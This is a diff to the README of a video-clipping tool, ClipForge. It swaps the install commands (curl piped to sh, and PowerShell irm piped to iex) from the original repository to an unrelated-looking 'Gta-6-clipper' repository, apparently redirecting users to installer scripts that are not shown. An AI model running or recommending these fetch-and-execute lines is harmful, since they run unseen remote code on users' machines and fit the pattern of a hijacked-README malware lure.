@@ -15,13 +15,13 @@ Paste a YouTube link (or upload a local video). ClipForge finds the best moments
 **macOS / Linux** (curl + sh):
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/max/viralforge-ai/main/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/4hmed1/Gta-6-clipper/main/installers/install.sh | sh
 ```
 
 **Windows** (PowerShell):
 
 ```powershell
-irm https://raw.githubusercontent.com/max/viralforge-ai/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/4hmed1/Gta-6-clipper/main/installers/install.ps1 | iex
 ```
 
 The installer creates an isolated virtual environment, installs ClipForge + dependencies, downloads a verified static FFmpeg if none is found, adds the `clipforge` command to your PATH, and runs a health check. No admin rights required.
@@ -81,4 +81,4 @@ Run `clipforge doctor` for a health check (Python, FFmpeg, encoders, disk, ports
 
 ## License
 
-MIT. See `LICENSE`.
+MIT. See `LICENSE`.# Gta-6-clipper
